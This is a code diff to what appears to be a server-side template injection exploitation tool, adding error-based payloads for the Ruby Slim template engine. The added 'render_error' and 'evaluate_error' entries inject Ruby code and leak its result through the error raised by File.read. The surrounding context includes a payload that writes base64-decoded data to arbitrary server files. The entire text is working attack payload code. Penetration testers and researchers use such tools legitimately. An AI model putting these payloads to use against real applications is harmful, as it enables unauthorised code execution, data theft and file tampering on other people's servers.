@@ -25,6 +25,14 @@ class Slim(ruby.Ruby):
                 'test_render': f"""#{{({rand.randints[0]}*{rand.randints[1]}).to_s}}""",
                 'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': """|#{{$h=({header[0]}+{header[1]}).to_s}}""",
+                # Body needs to set b as the output
+                'trailer': """#{{$t=({trailer[0]}+{trailer[1]}).to_s}}#{{File.read($h+$b+$t)}}""",
+                'test_render': f"""#{{$b=({rand.randints[0]}*{rand.randints[1]}).to_s}}""",
+                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
+            },
             'write': {
                 'call': 'inject',
                 'write': """|#{{require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}}}""",
@@ -39,6 +47,9 @@ class Slim(ruby.Ruby):
                 'call': 'render',
                 'test_os': """RUBY_PLATFORM""",
                 'test_os_expected': r'^[\w._-]+$'
+            },
+            'evaluate_error': {
+                'evaluate': """#{{$b=({code}).to_s}}""",
             },
             'execute_blind': {
                 'call': 'inject',
